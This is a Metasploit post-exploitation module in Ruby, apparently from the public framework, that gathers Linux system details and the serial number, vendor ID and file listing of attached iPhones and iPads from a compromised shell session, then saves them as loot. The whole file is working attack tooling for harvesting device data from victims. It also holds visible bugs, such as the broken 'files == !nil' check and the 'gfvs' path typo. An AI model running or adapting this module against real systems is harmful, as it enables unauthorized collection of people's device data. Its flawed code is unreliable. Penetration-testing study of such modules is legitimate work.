##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Linux::System


  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Linux Gather Apple Devices',
        'Description'   => %q{
          This module gathers information from apple devices.
        },
        'License'       => MSF_LICENSE,
        'Author'        =>
          [
            'Roberto Soares (espreto) <robertoespreto[at]gmail.com>', 
          ],
        'Platform'      => [ 'linux' ],
        'SessionTypes'  => [ 'shell' ]
      ))

  end

  def run
    distro = get_sysinfo
    store_loot(
      "linux.version",
      "text/plain",
      session,
      "Distro: #{distro[:distro]},Version: #{distro[:version]}, Kernel: #{distro[:kernel]}",
      "linux_info.txt",
      "Linux Version")

    # Print the info
    print_good("Info:")
    print_good("\t#{distro[:version]}")
    print_good("\t#{distro[:kernel]}")

    idVendor = execute("/usr/bin/lsusb -v 2>/dev/null | sed -n -e '/iPad/,/iSerial/p' -e '/iPhone/,/iSerial/p' | egrep 'idVendor' | awk '{print $2}'")
    idProduct = execute("/usr/bin/lsusb -v 2>/dev/null | sed -n -e '/iPad/,/iSerial/p' -e '/iPhone/,/iSerial/p' | egrep 'idProduct' | awk '{print $3,$4,$5}'")
    iSerial = execute("/usr/bin/lsusb -v 2>/dev/null | sed -n -e '/iPad/,/iSerial/p' -e '/iPhone/,/iSerial/p' | egrep 'iSerial' | awk '{print $3}'")
    who = execute("id -u")
    files = execute("ls -l /run/user/#{who}/gfvs/afc:host=#{iSerial} | awk '{print $9}'")

    print_good("Vendor ID: #{idVendor}")
    print_good("Product: #{idProduct}")
    print_good("Serial: #{iSerial}")
    print_good("Path: /run/user/#{who}/gfvs/afc:host=#{iSerial}")
    if files == !nil
      print_good("Files: #{files}")
    else
      print_error("Not mounted")
    end
    save("ID Vendor", idVendor)
    save("ID Product", idProduct)
    save("Serial number", iSerial)
    save("Files", files)
  end


  def save(msg, data, ctype="text/plain")
    ltype = "linux.enum.system"
    loot = store_loot(ltype, ctype, session, data, nil, msg)
    print_status("#{msg} stored in #{loot.to_s}")
  end

  def get_host
    case session.type
    when /meterpreter/
      host = sysinfo["Computer"]
    when /shell/
      host = session.shell_command_token("hostname").chomp
    end

    print_status("Running module against #{host}")

    return host
  end

  def execute(cmd)
    vprint_status("Execute: #{cmd}")
    output = cmd_exec(cmd)
    return output
  end

  def cat_file(filename)
    vprint_status("Download: #{filename}")
    output = read_file(filename)
    return output
  end
end
